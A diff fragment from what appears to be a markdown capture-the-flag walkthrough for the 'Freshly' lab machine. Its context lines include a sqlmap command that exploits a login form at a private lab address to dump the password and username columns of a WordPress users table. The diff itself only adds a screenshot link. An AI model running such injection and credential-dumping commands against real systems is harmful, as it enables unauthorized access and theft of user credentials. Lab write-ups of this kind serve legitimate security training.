@@ -46,3 +46,4 @@
 * 指定字段dump表
 * sqlmap -u "http://192.168.0.174/login.php" --form --level 3 -D wordpress8080 -T users -C "password,username" --dump
 * ![avatar](https://github.com/haidragon/NetworkTrafficAnalysis/blob/master/ctf/Freshly/images/user-pass.png)
+* ![avatar](https://github.com/haidragon/NetworkTrafficAnalysis/blob/master/ctf/Freshly/images/sqlmap.png)
